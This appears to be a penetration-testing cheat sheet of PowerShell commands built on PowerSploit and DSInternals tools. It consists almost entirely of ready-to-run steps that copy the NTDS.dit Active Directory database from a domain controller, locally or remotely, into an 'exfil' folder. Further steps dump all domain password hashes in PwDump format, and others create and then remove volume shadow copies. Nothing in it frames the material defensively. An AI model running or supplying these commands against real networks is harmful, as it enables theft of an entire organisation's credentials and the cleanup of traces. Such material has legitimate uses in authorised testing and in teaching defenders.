# PowerSploit

## Invoke-NinjaCopy

### Extract Shadow File

- Import Module

`PS C:\> Import-Module .\Invoke-NinjaCopy.ps1`

- Extract shadow copy locally

```
PS C:\> Invoke-NinjaCopy [-ComputerName "<domain_controller_IP>"] -Path "C:\Windows\NTDS\NTDS.dit" -LocalDestination "C:\exfil\ntds.dit"
```

- Extract shadow copy remotely

```
PS C:\> Invoke-NinjaCopy -ComputerName "<domain_controller_IP>" -Path "C:\Windows\NTDS\NTDS.dit" -RemoteDestination "C:\exfil\ntds.dit"
```

### Hashdump Shadow File

- Dump the hashes with PwDump format.

```
PS C:\> Get-ADDBAccount -All -DatabasePath "C:\exfil\ntds.dit" -Bootkey "C:\exfil\SYSTEM" | Format-Custom -View PwDump | Out-File -FilePath "C:\exfil\hashdump.pwdump" -Encoding ASCII
```

## VolumeShadowCopyTools

### Extract Shadow File

```
PS C:\> Import-Module .\VolumeShadowCopyTools.ps1

PS C:\> New-VolumeShadowCopy -Volume C:\

PS C:\> Get-VolumeShadowCopy
```

- Remove volume shadow copy

```
PS C:\> Get-VolumeShadowCopy | Remove-VolumeShadowCopy

PS C:\> Remove-VolumeShadowCopy -DevicePath '\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<n>'
```

---
## References

- [PowerSploit: Invoke-NinjaCopy](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)

- [DSInternals Powershell Documentation: Get-BootKey](https://github.com/MichaelGrafnetter/DSInternals/blob/master/Documentation/PowerShell/Get-BootKey.md)

- [DSInternals Powershell Documentation: Get-ADDBAccount](https://github.com/MichaelGrafnetter/DSInternals/blob/master/Documentation/PowerShell/Readme.md)

- [PowerSploit: VolumeShadowCopyTools](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/VolumeShadowCopyTools.ps1)

- [Netwrix: Extracting Password Hashes from the Ntds.dit File](https://blog.netwrix.com/2021/11/30/extracting-password-hashes-from-the-ntds-dit-file/)